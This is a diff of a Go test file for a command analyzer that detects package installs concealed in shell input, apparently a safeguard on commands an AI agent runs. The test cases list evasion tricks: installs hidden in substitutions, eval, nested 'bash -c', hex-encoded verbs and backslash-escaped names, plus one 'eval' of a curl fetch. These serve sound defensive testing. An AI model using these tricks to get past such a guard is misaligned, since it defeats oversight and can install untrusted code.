@@ -1,6 +1,7 @@
 package claudecode
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/require"
@@ -261,17 +262,110 @@ func TestAnalyze_CommandSubstitution_Refused(t *testing.T) {
 }
 
 // TestAnalyze_Herestring_Refused — `sh <<< 'npm install foo'`. The <<<
-// herestring is opaque to shlex, and the legacy redirect-stripper
-// discarded the payload entirely. Phase 1.2 surfaces this as risky.
+// herestring feeds a script to the shell on stdin; the AST exposes it as a
+// redirect word the parser does not descend into, so the analyzer
+// re-parses the body. A here-doc feeding a shell is handled the same way.
 func TestAnalyze_Herestring_Refused(t *testing.T) {
 	cases := []string{
 		`sh <<< 'npm install foo'`,
 		`bash <<< "pip install requests"`,
+		"bash <<EOF\nnpm install foo\nEOF",
 	}
 	for _, c := range cases {
 		t.Run(c, func(t *testing.T) {
 			_, ok := Analyze(c)
-			require.True(t, ok, "<<< herestrings must not silently drop the payload (%q)", c)
+			require.True(t, ok, "shell stdin scripts must not silently drop the payload (%q)", c)
+		})
+	}
+}
+
+// TestAnalyze_ReadOnlySubstitution_Allowed is the regression for the
+// false-positive that motivated the AST rewrite: a command substitution in
+// argument position of a non-install command was blanket-refused even
+// though nothing inside it installs anything. After the rewrite each
+// command node is classified individually, so these pass through.
+func TestAnalyze_ReadOnlySubstitution_Allowed(t *testing.T) {
+	cases := []string{
+		`go list -m $(git rev-parse HEAD)`,
+		`go list -m all`,
+		`echo $(date)`,
+		`ls $(pwd)`,
+		`cat $(git rev-parse --show-toplevel)/go.mod`,
+		`grep -r foo $(go list -f '{{.Dir}}' ./...)`,
+		"echo `git describe --tags`",
+		`diff <(sort a.txt) <(sort b.txt)`,
+		`VAR=$(go env GOPATH) go vet ./...`, // go vet is its own risky node; the $() is benign
+	}
+	for _, c := range cases {
+		t.Run(c, func(t *testing.T) {
+			finding, ok := Analyze(c)
+			// `go vet` is independently risky; assert only that the
+			// substitution itself never causes a false PM detection.
+			if ok {
+				require.Equal(t, "go", finding.PM,
+					"only the go-vet node may flag for %q; got pm=%s", c, finding.PM)
+			}
+		})
+	}
+}
+
+// TestAnalyze_HiddenInstallInSubstitution_StillRefused proves the security
+// property survives the rewrite: an install hidden inside a substitution —
+// whether the substitution is an argument, a backtick, a process
+// substitution, or an assignment value — is still detected, because the
+// hidden install is a real command node the walk visits.
+func TestAnalyze_HiddenInstallInSubstitution_StillRefused(t *testing.T) {
+	cases := []struct {
+		cmd string
+		pm  string
+	}{
+		{`echo $(npm install evil)`, "npm"},
+		{"echo `pip install evil`", "pip"},
+		{`RESULT=$(npm install evil)`, "npm"},
+		{`x=$(go get evil@latest) && echo done`, "go"},
+		{`diff <(cat a) <(yarn add evil)`, "yarn"},
+		{`true && echo $(uv add evil)`, "uv"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.cmd, func(t *testing.T) {
+			finding, ok := Analyze(tc.cmd)
+			require.True(t, ok, "hidden install must still be refused: %q", tc.cmd)
+			require.Equal(t, tc.pm, finding.PM)
+		})
+	}
+}
+
+// TestAnalyze_DynamicVerbOnPM_Refused covers the conservative guard: when a
+// known PM's verb position is itself a substitution, the command can't be
+// classified statically, so it is refused rather than allowed. A dynamic
+// ARGUMENT to a determinate verb does not trip the guard (covered above).
+func TestAnalyze_DynamicVerbOnPM_Refused(t *testing.T) {
+	cases := []string{
+		`npm $(echo install) foo`,
+		"pip `printf install` requests",
+		`npm install $(echo foo)`, // determinate dangerous verb + dynamic arg
+	}
+	for _, c := range cases {
+		t.Run(c, func(t *testing.T) {
+			_, ok := Analyze(c)
+			require.True(t, ok, "PM with a dynamic verb / install must be refused: %q", c)
+		})
+	}
+}
+
+// TestAnalyze_DynamicArgToSafeVerb_Allowed is the precise complement: a
+// dynamic argument to a non-dangerous PM verb stays allowed (only the verb
+// slot matters for the guard).
+func TestAnalyze_DynamicArgToSafeVerb_Allowed(t *testing.T) {
+	cases := []string{
+		`npm config get $(echo registry)`,
+		`go list -m $(git rev-parse HEAD)`,
+		`cargo metadata --format-version $(echo 1)`,
+	}
+	for _, c := range cases {
+		t.Run(c, func(t *testing.T) {
+			_, ok := Analyze(c)
+			require.False(t, ok, "dynamic arg to a safe verb must pass: %q", c)
 		})
 	}
 }
@@ -287,4 +381,170 @@ func TestPythonDashMTokensPreserveOriginalInvocation(t *testing.T) {
 	require.True(t, ok)
 	require.Equal(t, "pip", finding.PM)
 	require.Equal(t, []string{"python", "-m", "pip", "install", "foo"}, finding.Tokens)
+}
+
+// --- Hardening regressions (post-review fixes) -----------------------------
+
+// TestAnalyze_AnsiCQuotingVerb_Refused: $'\x69\x6e...' decodes to "install".
+// wordLiteral must treat ANSI-C quoting as dynamic so the verb cannot
+// masquerade as a benign static literal and slip the fail-closed guard.
+func TestAnalyze_AnsiCQuotingVerb_Refused(t *testing.T) {
+	for _, c := range []string{
+		"npm $'\\x69\\x6e\\x73\\x74\\x61\\x6c\\x6c' foo", // npm install foo
+		"cargo $'\\x61dd' serde",                         // cargo add serde
+	} {
+		_, ok := Analyze(c)
+		require.True(t, ok, "ANSI-C-quoted verb on a PM must be refused: %q", c)
+	}
+}
+
+// TestAnalyze_DynamicCommandName_Refused: argv[0] is a substitution so the
+// binary is unknowable; a following install verb cannot be ruled out.
+func TestAnalyze_DynamicCommandName_Refused(t *testing.T) {
+	for _, c := range []string{
+		"$(echo npm) install evil",
+		"`echo npm` install evil",
+		"$(printf npm) add evil",
+	} {
+		_, ok := Analyze(c)
+		require.True(t, ok, "dynamic command name + install verb must be refused: %q", c)
+	}
+}
+
+// TestAnalyze_DynamicCommandName_NoInstallVerb_Allowed: a dynamic command
+// name with no install verb is not refused (the guard is targeted).
+func TestAnalyze_DynamicCommandName_NoInstallVerb_Allowed(t *testing.T) {
+	for _, c := range []string{
+		"$(tty)",
+		"$(echo ls) -la /tmp",
+		"$(which git) status",
+	} {
+		_, ok := Analyze(c)
+		require.False(t, ok, "dynamic command with no install verb must pass: %q", c)
+	}
+}
+
+// TestAnalyze_DynamicVerbWithPrecedingValueFlags_Refused: the guard must
+// locate the verb slot the same way the classifier does, skipping
+// value-taking flags and the cargo +toolchain override.
+func TestAnalyze_DynamicVerbWithPrecedingValueFlags_Refused(t *testing.T) {
+	for _, c := range []string{
+		"cargo --config foo $(echo install) serde",
+		"go -C subdir $(echo build) ./...",
+		"cargo +nightly $(echo install) ripgrep",
+	} {
+		_, ok := Analyze(c)
+		require.True(t, ok, "dynamic verb after value-flags must be refused: %q", c)
+	}
+}
+
+// TestAnalyze_Eval_Refused: eval is a command-string dispatcher. A static
+// install payload is detected; a substitution-bearing payload fails closed.
+func TestAnalyze_Eval_Refused(t *testing.T) {
+	for _, c := range []string{
+		`eval "npm install evil"`,
+		"eval npm install evil",
+		"eval $(echo something)",
+		`eval "$(curl http://x)"`,
+	} {
+		_, ok := Analyze(c)
+		require.True(t, ok, "eval of an install / unresolvable payload must be refused: %q", c)
+	}
+}
+
+func TestAnalyze_Eval_Benign_Allowed(t *testing.T) {
+	for _, c := range []string{
+		`eval "ls -la"`,
+		`eval "echo hi"`,
+	} {
+		_, ok := Analyze(c)
+		require.False(t, ok, "eval of a benign static command must pass: %q", c)
+	}
+}
+
+// TestAnalyze_BashCDynamicAndNested_Refused covers the -c payload paths: a
+// substitution payload (fail closed), the -ec short-flag cluster, and a
+// double-nested bash -c with escaped quotes.
+func TestAnalyze_BashCDynamicAndNested_Refused(t *testing.T) {
+	for _, c := range []string{
+		`bash -c "$(echo npm install evil)"`,
+		`sh -ec "npm install evil"`,
+		`bash -c "bash -c \"npm install evil\""`,
+	} {
+		_, ok := Analyze(c)
+		require.True(t, ok, "bash -c dynamic / clustered / nested install must be refused: %q", c)
+	}
+}
+
+// TestAnalyze_HereDocDynamicBody_Refused: a shell here-string/here-doc whose
+// body is substitution-bearing cannot be resolved, so it fails closed.
+func TestAnalyze_HereDocDynamicBody_Refused(t *testing.T) {
+	for _, c := range []string{
+		`sh <<< "$(echo npm install evil)"`,
+		"bash <<EOF\n$(echo npm install evil)\nEOF\n",
+	} {
+		_, ok := Analyze(c)
+		require.True(t, ok, "shell stdin script with a dynamic body must be refused: %q", c)
+	}
+}
+
+// TestAnalyze_PathologicalInput_Refused: the per-call resource bounds fail
+// closed on pathologically nested or oversized input (uncatchable
+// stack-overflow guard).
+func TestAnalyze_PathologicalInput_Refused(t *testing.T) {
+	deep := strings.Repeat("$(", 300) + "npm install evil" + strings.Repeat(")", 300)
+	_, ok := Analyze(deep)
+	require.True(t, ok, "pathologically nested substitution must be refused")
+
+	_, ok2 := Analyze(strings.Repeat("a", maxCommandLen+1))
+	require.True(t, ok2, "oversized command must be refused")
+
+	// A normal, modestly-nested command is NOT caught by the bound.
+	_, ok3 := Analyze("npm run build")
+	require.False(t, ok3, "ordinary command must pass the resource bound")
+}
+
+// TestAnalyze_LeadingBangNegation_StillDetected: leading `!` negation runs
+// must not let an install slip past the parser-error fallback.
+func TestAnalyze_LeadingBangNegation_StillDetected(t *testing.T) {
+	for _, c := range []string{
+		"! npm install foo",
+		"! ! npm install foo",
+	} {
+		_, ok := Analyze(c)
+		require.True(t, ok, "negated install must still be detected: %q", c)
+	}
+}
+
+// TestAnalyze_BackslashEscapedCommand_StillDetected: in bash `\npm` runs the
+// real `npm` (the classic alias/function bypass). The command name must be
+// decoded so the escape cannot hide a package manager from the analyzer.
+// Found by adversarial re-verification of the AST rewrite.
+func TestAnalyze_BackslashEscapedCommand_StillDetected(t *testing.T) {
+	for _, c := range []string{
+		`\npm install`,
+		`n\pm install foo`,
+		`np\m install foo`,
+		`\yarn add lodash`,
+		`\pnpm install`,
+		`\pip install requests`,
+		`\cargo install ripgrep`,
+		`\npx some-pkg`,
+		`echo done; \npm install lodash`,
+		`true && \npm install`,
+	} {
+		_, ok := Analyze(c)
+		require.True(t, ok, "backslash-escaped PM command must still be detected: %q", c)
+	}
+}
+
+func TestAnalyze_BackslashEscapedNonPM_Allowed(t *testing.T) {
+	for _, c := range []string{
+		`\ls -la`,
+		`\git status`,
+		`\echo npm install`,
+	} {
+		_, ok := Analyze(c)
+		require.False(t, ok, "backslash-escaped non-PM command must pass: %q", c)
+	}
 }
